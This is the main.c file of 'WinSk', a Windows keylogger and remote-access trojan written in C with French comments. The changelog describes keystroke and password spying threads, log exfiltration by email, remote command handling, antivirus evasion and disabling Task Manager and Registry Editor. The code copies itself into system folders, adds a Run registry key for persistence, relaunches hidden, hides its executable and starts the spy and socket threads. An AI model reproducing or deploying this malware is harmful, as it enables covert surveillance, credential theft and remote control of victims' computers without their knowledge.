//=============================================================================
// Projet : WinSk
// version : 7.2
// Auteur : AXeL
// Fichier : main.c
// Date de création : 18/10/2013 (v 2.0)
// Date de la dernière modification : 04/11/2018
// Lacunes : - (résolu) Si le fichier de configuration éxiste déjà, le nom du programme
//             peut être différent de celui dans la variable Parametres.NomProcessus
// Idées d'amélioration : - Envoyer une capture d'écran avec chaque log
//                        - Détecter les passphrases wifi enregistré sur l'ordi. et les envoyer
//                        - (résolu) Cryptage des logs lors de l'envoie (algo. vigenere)
//                          => ajouter un programme de décryptage/sauvegarde des logs
//                        - (résolu) Modifier l'emplacement du fichier de configuration si
//                          DeepFreez ou autre détecté
// Modifications récentes : - 27/12/2013: (v 3.0)
//                             - Optimisation de l'espion au niveau de l'usage CPU
//                             - Capture&Correction de nouvelles touches dans l'espion
//                             - Suppression des bouts du code qui ont été détectés
//                               par antivirus
//                             - Le nombre de thread utilisé descend à 1 seul thread
//                          - 29/12/2013: (v 3.1)
//                             - Changement du sujet du log dans EnvoyerLog()
//                          - 03/01/2013: (v 4.0)
//                             - Ajout du thread PopConnexion pour gérer le programme 
//                               à distance
//                             - Lancer/arrêter les threads à distance
//                             - Ajout d'une fonction de sauvegarde des paramétres
//                             - Mise à jour invisible si nom du mutex différent de celui
//                               de la version courante
//                          - 04/01/2014:
//                             - Révision/optimisation de la lisibilité de la fonction main
//                             - Ajout de FILES_PATH dans 'resources.h' qui permettra
//                               de changer l'emplacement des fichiers log et configuration
//                             - Ajout de la fonction cacherFichier()
//                          - 06/01/2014:
//                             - Réglage d'un beug au niveau de la fonction nbrLignesFichier()
//                          - 18/01/2014:
//                             - !BETA! : Modification du thread PopConnexion (changement du
//                               serveur pop exactement)
//                             - Ajout de la fonction enleverCaracteres()
//                             - Ajout d'une constante pour activer/désactiver la version
//                               test + ajout des fonctionnalités de cette version :
//                                  - Stockage des fichiers(Log, Config.) sur le disque local D:
//                                  - On cache ces fichiers aussi
//                                  - Le nom du processus du programme change
//                                  - Le thread Espion est désactivé dans cette version
//                          - 19/01/2014:
//                             - Mineurs modifications dans le thread Espion (ajustement du
//                               traitement de l'historique des touches CTRL/ALT et SHIFT)
//                          - 23/01/2014:
//                             - Ajout de la fonction recupererIp()
//                          - 24/01/2014:
//                             - Modification du chemin de copie de l'éxé dans la fonction
//                               main (DEFAULT_PATH)
//                             - Modification de la gestion des erreurs d'infiltration dans
//                               la fct. main
//                          - 08/02/2014: (v 4.1)
//                             - Ajout d'un 3ème paramétre => StopSender
//                             - Quelques modifications sur les chemins d'accès
//                               en test version
//                          - 25/09/2015: (v 5.1)
//                             - Ajout de sendMail.c qui contient la fonction sendMail()
//                               qui permet l'envoie de mail via GMAIL avec SSL.
//                             - Modification du thread d'envoie de mail, EnvoyerLog().
//                             - Dorénavant, On arrête le processus d'une ancienne version avant de l'écraser.
//                             - Désactivation du thread PopConnexion()
//                             - Le nombre de thread passe à 1
//                          - 29/09/2015 - 30/09/2015: (v 6.0)
//                             - Ajout du thread ClientSocket
//                             - Le nombre de thread passe à 2
//                             - Suppression des bouts de code non nécessaire/anciens
//                             - Changement de l'icone du programme (en icone d'image).
//                          - 01/10/2015:
//                             - Modification des paramétres (suppression de ceux non nécéssaires).
//                             - Ajout de la fonction checkParametres() pour vérifier les paramétres.
//                             - Modification de la fonction main(), plus précisament de la gestion
//                               de Mise à jour et d'anciennes versions et du lancement des threads.
//                             - Ajout du thread EspionMdp().
//                          - 02/10/2015:
//                             - Correction des fuites de mémoire des fonctions qui renvoient un pointeur.
//                             - Amélioration des fonctions d'envoie/réception de fichiers
//                               (la taille du fichier est envoyée en premier maintenant +
//                               ajout d'une synchronisation entre client et serveur avant d'envoyer ou recevoir un fichier).
//                             - Organisation des commandes serveur + suppression/modification de quelque une.
//                             - Ajout de crypt.c, donc du cryptage/décryptage du text entre client/serveur
//                               (commande et/ou reponse, tandis que les fichiers sont envoyé/reçu en clair).
//                             - Correction de plusieurs problèmes au niveau des commandes.
//                             - Optimisation + Test du thread EspionMdp().
//                             - Correction du code de la Commande Explore_Directory.
//                             - Ajout de la constante/directive préprocesseur CRYPT_DECRYPT, du côté du
//                               client et du serveur, qui permet d'activer ou désactiver le cryptage.
//                          - 03/10/2015: (v 6.1)
//                             - Ajout de la commande Explore_Drives qui retourne les partitions courantes.
//                             - Plusieurs modifications au niveaux des commandes/fonctions pour s'addapter au serveur.
//                             - Maintenant si la taille du fichier à envoyer == 0 on annule l'envoie.
//                          - 04/10/2015:
//                             - Désactivation des messages d'erreur en cas de crash.
//                             - Refonte/Correction de la commande File_Opr.
//                             - Amélioration de la fonction cacherFichier().
//                             - Ajout de la fonction afficherFichier().
//                             - Ajout du define HIDE_FILES qui permet de cacher l'exé et les fichiers de config et log..
//                             - Ajout de la fonction ecraserFichier().
//                             - Ajout de l'écrasement de l'ancienne version et son fichier config dans le main().
//                          - 05/10/2015:
//                             - Correction/Amélioration des commandes.
//                          - 06/10/2015:
//                             - Il n'est plus possible de combiner des commandes (car cela pourrais provoquer un problème).
//                             - Ajout de la commande Update_Config.
//                          - 07/10/2015:
//                             - Maintenant le thread Client s'occupe d'enregistrer la date d'aujourd'hui et l'heure du lancement,
//                               par contre s'il est désactivé/arrêté le thread Espion ou EspionMdp le fera à sa place.
//                          - 09/10/2015:
//                             - Modification des commandes de clic sourie.
//                          - 10/10/2015:
//                             - Réecriture de la fonction tailleFichier() en API car elle renvoyait
//                               une taille + grande que la véritable taille du fichier.
//                          - 21/10/2015:
//                             - Utilisation du mot de passe par défaut dans crypt.c à cause des erreurs de décryptage.
//                          - 22/10/2015:
//                             - Passage à la méthode de cryptage/décryptage xor(), pour éviter les erreurs lors du changement
//                               du mot de passe de la méthode Crypt().
//                             - Suppression des commandes : Hide_As_System_File et Show_File.
//                             - Ajout des commandes/Remplacement par : Get_F_Info et Set_F_Info.
//                          - 27/10/2015: (v 6.2)
//                             - Mise à jour/Correction de la commande Reg_Set.
//                          - 28/10/2015:
//                             - Correction de la commande Set_Volume, ainsi qu'une petite correction au niveau de la fonction
//                               ajouterModifierRegistre().
//                          - 21/01/2017: (v 7.0)
//                             - Gestion des paramètres passés en ligne de commande.
//                          - 31/03/2017:
//                             - Quelques corrections/réctifications mineurs des nouveautés de la v7.0
//                             + ToDo : Connexion IMAP/POP3 à l'adresse email et vérifier s'il y'a des messages reçu contenant des
//                               commandes au cas ou le serveur est hors-ligne (ou meme lancer un exe qui s'occupera de faire ça).
//                          - 04/04/2017:
//                             - Ajout d'une interface graphique simple pour le client aussi (en version de test uniquement)
//                               activable/désactivable à travers la constante NO_GUI.
//                             + ToDo : Code du boutton Send/Envoyer (mais il faudra faire attention, quand on reçoit un fichier
//                               du serveur par exemple etc..)
//                             - J'ai commenté le code du thread EnvoyerLog car ça ne fonctionne plus (même avec SSL).
//                          - 11/07/2017:
//                             - Ajout de la possibilité de se connecter à plusieurs serveur (un à la fois) au lieu d'un seul auparavant.
//                             - Réduction du temps d'attente avant reconnexion + définition d'une constante pour cela.
//                          - 12/07/2017: (v 7.1)
//                             - Implémentation du code du boutton Envoyer et ajout des fonctions lockGUI et unlockGUI.
//                             - Ajout d'un nouveau thread 'ToDoThread' qui s'occupe d'exécuter des commandes à retardement.
//                             - Ajout des commandes Add_ToDo/Delete_ToDo/List_ToDo qui permettent d'ajouter/supprimer/lister les ToDo.
//                          - 13/07/2017:
//                             - Ajout du fichier 'todo.c' qui contient toutes les fonctions de la liste chainée 'ToDoList'.
//                             - Ajout de la commande Free_ToDo qui permet de vider la ToDoList.
//                             - Ajout de la fonction ToAlwaysDo() qui permet d'effectuer des actions à chaque démarrage.
//                             - La constante TEST_VERSION peut prendre 3 valeurs maintenant, soit 0, 1 ou 2.
//                             - Ajout de la commande Set_Task_Manager qui permet d'activer ou de désactiver le Gestionnaire des tâches.
//                          - 14/07/2017:
//                             - Correction d'une petite erreur concernant la variable tailleF sur la fonction checkParametres().
//                             - Correction du comportement lors de la détection d'une ancienne version en mode NO_INFILTRATION.
//                             - Ajout de la vérification des paramètres pour les commandes Add_ToDo et Delete_ToDo.
//                          - 16/07/2017: (v 7.2)
//                             - Ajout de la constante ENABLE_MULTI_INSTANCE et de la variable ALLOW_MULTI_INSTANCE.
//                             - Ajout du paramètre en ligne de commande --allow-multi-instance.
//                             - Ajout de la constante DISABLE_TASK_MANAGER.
//                          - 17/07/2017:
//                             - Ajout des fonctions is_file() et is_dir().
//                             - La fonction exploreDirectory() renvoie maintenant une valeur booléene de plus pour indiquer 
//                               si chaque fichier/dossier est un dossier ou non (0|1).
//                          - 20/07/2017:
//                             - Ajout de la constante DISABLE_REGISTRY_EDITOR.
//                             - Ajout de la commande Set_Registry_Editor.
//                          - 04/11/2018:
//                             - Ajout de la commande Get_Elapsed_Time.
//
//
// - Lacunes/Travail à faire :
//             - Le double clic ne fonctionne pas après l'avoir testé, pour une raison ou une autre
//               que je connais pas, si jamais quelqu'un a une solution, vous me le dites.
//             - Relire et corriger les commandes serveurs (par exemple corriger la non
//               gestion des espaces dans un path pour certaines commandes).
//             - (résolu) Refaire/Recoder les fonctions d'écriture/lecture des fichiers en Windows API.
//             - (résolu) Parfois, je dit bien parfois l'envoie/réception de fichiers bloque, je pense
//               à y remedier en utilisant des threads pour l'envoie/récéption, mais ça reste
//               à revoir comme même.
//
//=============================================================================

#include "resources.h"


//=============================================================================
//                            Fonction principale
//=============================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrecedente, LPSTR lpCmdLine, int nCmdShow)
{
   // Gestion des paramètres passés en ligne de commande
   char * pch;
   pch = strtok (lpCmdLine, " ");
   
   DO_INFILTRATION = ! NO_INFILTRATION; // Pour activer/désactiver l'infiltration
   ALLOW_MULTI_INSTANCE = ENABLE_MULTI_INSTANCE;
   
   while (pch != NULL)
   {
      if (! strcmp(pch, "--version"))
      {
         #if NO_GUI == TRUE
            printf("%s\n", NOM_MUTEX);
         #else
            MessageBox(NULL, NOM_MUTEX, "Version", MB_OK | MB_ICONINFORMATION);
         #endif
         return 0;
      }
      else if (! strcmp(pch, "--no-infiltration"))
      {
         DO_INFILTRATION = FALSE;
      }
      else if (! strcmp(pch, "--allow-multi-instance"))
      {
         ALLOW_MULTI_INSTANCE = TRUE;
      }
      
      pch = strtok (NULL, " ");
   }
   
   free(pch);
   
   // Création de l'interface graphique
   if (! NO_GUI)
   {
      HINSTANCE hInstRich32;
      MSG msg;
      WNDCLASS wc = { 0 };
   
      InitCommonControls(); /* Initialisation des contrôles communs */
    
      hInstRich32 = LoadLibrary("RICHED32.DLL"); /* Chargement de la DLL pour les Rich Edit */
   
      if(!hInstRich32)
      {
         MessageBox(NULL, "Impossible de charger RICHEDIT32.DLL !", NOM_MUTEX, MB_OK | MB_ICONWARNING);
         return 0;	
      }
   
      hInst = hInstance;
   
      wc.lpfnWndProc = MainWndProc;
      wc.hInstance = hInstance; 
      wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICONE)); 
      wc.hCursor = LoadCursor(NULL, IDC_ARROW); 
      wc.hbrBackground = NULL; 
      wc.lpszMenuName =  NULL; 
      wc.lpszClassName = "MainWinClass"; 
      wc.hbrBackground = (HBRUSH) (COLOR_BTNFACE + 1); /* Use Windows's default color as the background of the window */
 
      if(!RegisterClass(&wc)) return FALSE; 
 
      /* Création de la fenetre principale */
      hwFenetre = CreateWindowEx(WS_EX_TOPMOST, wc.lpszClassName, NOM_MUTEX,
                                 WS_POPUPWINDOW | WS_CAPTION | WS_OVERLAPPED | WS_MINIMIZEBOX,
                                 PX_ECRAN, PY_ECRAN, L_FENETRE, H_FENETRE, NULL, NULL, hInstance, NULL);
   
      if (!hwFenetre)  return FALSE;
 
      /* Affichage de la fenêtre */
      ShowWindow(hwFenetre, SW_SHOW);
      
      /* Gestion des messages/notifications */
      while (GetMessage(&msg, NULL, 0, 0)) 
      { 
          TranslateMessage(&msg);
          DispatchMessage(&msg);
      }
      
      /* Libération de la DLL pour les Rich Edit */
      if(!FreeLibrary (hInstRich32))
	      MessageBox(NULL, "Bibliothèque RICHEDIT non libérée !", NOM_MUTEX, MB_OK | MB_ICONWARNING);
    
      return msg.wParam;
   } // fin if (! NO_GUI)
   else
   {
      /* On désactive tout les messages d'erreur en cas de crash quand l'interface graphique est désactivée */
      SEM fSetErrorMode;
      HMODULE kernel32_dll = GetModuleHandle("kernel32.dll"); // dynamically load kernel32.dll
      if (kernel32_dll) {
         fSetErrorMode = (SEM)GetProcAddress(kernel32_dll, "SetErrorMode");

         if (fSetErrorMode)
            fSetErrorMode(SEM_NOGPFAULTERRORBOX); // hide system messages if program crashes
      }
      
      /* Lancement des Threads */
      lancerThreads();
   
   } // fin else > if (! NO_GUI)
   
return 0;
}

//=============================================================================
//              Fonction de vérification de lancement des Threads
//=============================================================================

int lancerThreads()
{
   /* Vérification de l'éxistence du fichier de configuration */
   if (! NO_GUI) appendToRichConsole("CHECKING CONFIG. FILE...", "");
   
   if (lireFichier(FILES_PATH, NOM_CONFIG_FILE, "", 0))
   {
      if (! NO_GUI) appendToRichConsole("CONFIG. FILE", "OK");
      /* Vérification de l'éxistence du fichier de reset */
      if (lireFichier(FILES_PATH, NOM_RESET_FILE, "", 0))
      {
         if (! NO_GUI)
         {
            appendToRichConsole("RESET FILE", "DETECTED");
            MessageBox(NULL, "RESET FILE DETECTED", NOM_MUTEX, MB_OK | MB_ICONINFORMATION); // sans ce message, la fenêtre GUI ne s'affiche pas (pq? j'en sais rien..)
         }
         Sleep(5000); /* Pour attendre la fermeture du programme au cas ou */
         /* Suppression du fichier reset (on n'en a plus besoin) */
         char pathResetFile[200];           
         sprintf(pathResetFile, "%s\\%s", FILES_PATH, NOM_RESET_FILE);
         /* Si jamais le fichier est caché/system ou en lecture seule */
         SetFileAttributes(pathResetFile, FILE_ATTRIBUTE_NORMAL);
         DeleteFile(pathResetFile);
      }
      
      /* vérification des paramétres */
      if (checkParametres(FILES_PATH, NOM_CONFIG_FILE))
         chargerParametres(TRUE, FILES_PATH, NOM_CONFIG_FILE);
      else /* C'est surement une ancienne version */
         lstrcpy(Parametres.Version, "OLD_VERSION"); /* juste question que la chaine ne reste pas vide */
      
      /* Si ancienne version */
      if (lstrcmp(Parametres.Version, NOM_MUTEX))
      {
         if (! NO_GUI) appendToRichConsole("OLD VERSION", "DETECTED");
         // si on est en mode infiltration (NO_INFILTRATION == FALSE)
         if (DO_INFILTRATION) // if (! NO_INFILTRATION)
         {
            /* 1 - On arrête l'ancienne version (si jamais elle est toujours ouverte, si nn arreterProgramme() va retourner un FALSE) */
            arreterProgramme(NOM_PROCESSUS);
            Sleep(3000); // On attend 3 seconde que ça se ferme
            /* 2 - On supprime l'ancienne version (si jamais elle est caché/sytem) */
            if (ecraserFichier(SYSTEM_PATH, NOM_PROCESSUS) != 0) // si erreur d'écrasement
            {
               if (ecraserFichier(DEFAULT_PATH, NOM_PROCESSUS) == 0) // on utilise l'autre path/chemin
                  ecraserFichier(DEFAULT_PATH, NOM_CONFIG_FILE); // on écrase son fichier de configuration aussi
            }
            else
               ecraserFichier(SYSTEM_PATH, NOM_CONFIG_FILE); // on écrase le fichier de configuration aussi
         }
         /* 3 - Nouvelle infiltration */
         goto Infiltration_automatique;
      }
      else // si nn (ce n'est pas une ancienne version)
      {
         if (! NO_GUI) appendToRichConsole("CHECKING MUTEX...", "");
         HANDLE hMutex;
         hMutex = CreateMutex (NULL, FALSE, NOM_MUTEX); /* Instance */
         if (GetLastError() == ERROR_ALREADY_EXISTS) /* Si double instance */
         {
            if (! NO_GUI)
            {
               appendToRichConsole("DOUBLE INSTANCE", "DETECTED");
               if (! ALLOW_MULTI_INSTANCE)
               {
                  appendToRichConsole("MUTEX CHECK", "KO");
                  appendToRichConsole("PLEASE CLOSE THIS WINDOW", "WARNING");
               }
            }
            if (! ALLOW_MULTI_INSTANCE) return 0; // arrêt 
         }
         else if (! NO_GUI)
            appendToRichConsole("MUTEX CHECK", "OK");
      }
   }
   else /* Infiltration automatique en mode invisible */
   {
      if (! NO_GUI) appendToRichConsole("CONFIG. FILE", "KO");
      
      Infiltration_automatique: /* Block de code d'infiltration automatique (étiquette xD) */
      
      chargerParametres(FALSE, "", ""); /* Chargement des paramétres par défaut */
      
      if (DO_INFILTRATION)
      {
         if (! NO_GUI) appendToRichConsole("INFILTRATION...", "");
         BOOL copieSuccess = FALSE;
         char lpNomExe[MAX_PATH];
      
      /* Etape 1 : Copie/infiltration au système */
   
         /* 1ère méthode de copie (SYSTEM_PATH) */
         char *nomProgram;
         sprintf(Parametres.RepertoireInfiltration, "%s", SYSTEM_PATH);
         sprintf(lpNomExe, "%s\\%s", SYSTEM_PATH, Parametres.NomProcessus);
         nomProgram = recupNomDuProgramme(1);
         copieSuccess = CopyFile(nomProgram, lpNomExe, FALSE);
         
         if (! NO_GUI) appendToRichConsole("COPY TO SYSTEM_PATH", copieSuccess ? "OK" : "KO");
         
         if (!copieSuccess) /* Si échec de copie (99% à cause du mode administrateur) */
         {
            /* 2ème méthode de copie (DEFAULT_PATH) */
            CreateDirectory(DEFAULT_DIRECTORY, NULL); /* On crée alors un nv dossier (dans la racine) */
            CreateDirectory(DEFAULT_PATH, NULL); /* On crée un sous dossier (qui va contenir l'éxé) */
            sprintf(Parametres.RepertoireInfiltration, "%s", DEFAULT_PATH);
            sprintf(lpNomExe, "%s\\%s", DEFAULT_PATH, Parametres.NomProcessus);
            copieSuccess = CopyFile(nomProgram, lpNomExe, FALSE);
            
            if (! NO_GUI) appendToRichConsole("COPY TO DEFAULT_PATH", copieSuccess ? "OK" : "KO");
         }
      
         free(nomProgram); // car nomProgram est utilisé dans les 2 méthodes de copie
      
         if (copieSuccess) /* Si copie réussie, j'ai pas mis d'else if içi pour tenter les 2 méthodes de copie */
         {
      
      /* Etape 2 : On assure le lancement aux prochains démarrages */
      
            char nomClef[64];
            lstrcpy(nomClef, Parametres.NomProcessus); // copie dans nomClef (nomClef = Parametres.NomProcessus)
            /* Extraction du nom de la clef registre depuis le nom du processus */
            extractProcessusNameFrom(nomClef);
         
            /* Lancement au démarrage (création d'une clef registre) */
            DWORD dwDisposition;
            HKEY hkSub = NULL;
            LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            LONG openRes = RegCreateKeyEx(HKEY_CURRENT_USER, sk, 0 , NULL, 0, KEY_READ | KEY_WRITE, NULL, &hkSub, &dwDisposition);
            LPCTSTR name = nomClef;
            LPCTSTR data = lpNomExe;
            LONG setRes = RegSetValueEx (hkSub, name, 0, REG_SZ, (LPBYTE)data, strlen(data)+1);
            if (setRes != ERROR_SUCCESS) Parametres.LancementAuDemarrage = FALSE; /* Si échec */
            
            if (! NO_GUI) appendToRichConsole("RUN ON BOOT", setRes == ERROR_SUCCESS ? "OK" : "KO");
   
      /* Etape 3 : Sauvegarde des paramétres */
   
            if (! NO_GUI) appendToRichConsole("SAVING SETTINGS...", "");
            sauvegarderParametres();
         }
         else
         {
            if (! NO_GUI) appendToRichConsole("INFILTRATION", "KO");
            return 0; /* échec et mat !><! (Sortie du programme) */
         }
         
         if (! NO_GUI) appendToRichConsole("INFILTRATION", "OK");
         
      /* Etape 4 : Reboot programme (Si copieSuccess == TRUE on arrivera içi) */
   
         if (! NO_GUI) appendToRichConsole("REBOOTING...", "");
         ShellExecute(NULL, "open", lpNomExe, NULL, NULL, SW_HIDE); /* Relancement du programme */
      
         // On cache l'exé (il faut le mettre après le lancement, si nn ça ne marche pas)
         if (HIDE_FILES)
         {
            appendToRichConsole("HIDING FILES...", "");
            cacherFichier(lpNomExe, "", TRUE, FALSE);
         }
         
         return 0;
      } // fin if (DO_INFILTRATION)
      else
      {
         if (! NO_GUI) appendToRichConsole("SAVING SETTINGS...", "");
         sauvegarderParametres();
      }
   }
   
   /* "Well done !" Au travail */
   if (! NO_GUI)
   {
      appendToRichConsole("STARTING THREADS...", "");
      appendToRichConsole("-------------------", "");
      appendToRichConsole("Espion Thread", Parametres.StopEspion ? "KO" : "OK");
      appendToRichConsole("EspionMdp Thread", Parametres.StopEspionMdp ? "KO" : "OK");
      appendToRichConsole("ClientSocket Thread", Parametres.StopClientThread ? "KO" : "OK");
      appendToRichConsole("EnvoyerLog Thread", Parametres.StopSender ? "KO" : "OK");
      appendToRichConsole("ToDo Thread", Parametres.StopClientThread ? "KO" : "OK");
      appendToRichConsole("-------------------", "");
   }
   
   /* Save startup time */
   startupTime = GetTickCount();
   
   /* Initialisation de la section critique */
   DWORD dwThreadId[NOMBRE_THREADS];
   DWORD dwThreadParam = 1;
   /* Création/Lancement des Threads (pas la peine de mettre un thread en commentaire, pour le désactiver, go ==> 'Ressources.h') */
   hThread[0] = CreateThread(NULL, 0, Espion, &dwThreadParam, 0, &dwThreadId[0]);
   hThread[1] = CreateThread(NULL, 0, EspionMdp, &dwThreadParam, 0, &dwThreadId[1]);
   hThread[2] = CreateThread(NULL, 0, ToDoThread, &dwThreadParam, 0, &dwThreadId[2]);
   
   if (NO_GUI)
   {
      //hThread[3] = CreateThread(NULL, 0, EnvoyerLog, &dwThreadParam, 0, &dwThreadId[3]);
      ClientSocket(0); /* Appel au ClientSocket (cm un appel de fct), car c'est le thread perssistant en TEST_VERSION et en version normale */
      /* Attente de la fin d'éxecution des Threads (!@! si espion arrêté) */
      WaitForMultipleObjects(NOMBRE_THREADS, hThread, TRUE, INFINITE);
      /* Destruction des Threads et de la section critique */
      CloseHandle(hThread[0]);
      CloseHandle(hThread[1]);
      CloseHandle(hThread[2]);
      //CloseHandle(hThread[3]);
   }
   else
   {
      hThread[3] = CreateThread(NULL, 0, ClientSocket, &dwThreadParam, 0, &dwThreadId[3]);
      //hThread[4] = CreateThread(NULL, 0, EnvoyerLog, &dwThreadParam, 0, &dwThreadId[4]);
      /* la fermeture des threads se fait dans l'evenement WM_DESTROY de la gui (voir gui.c) */
   }
}
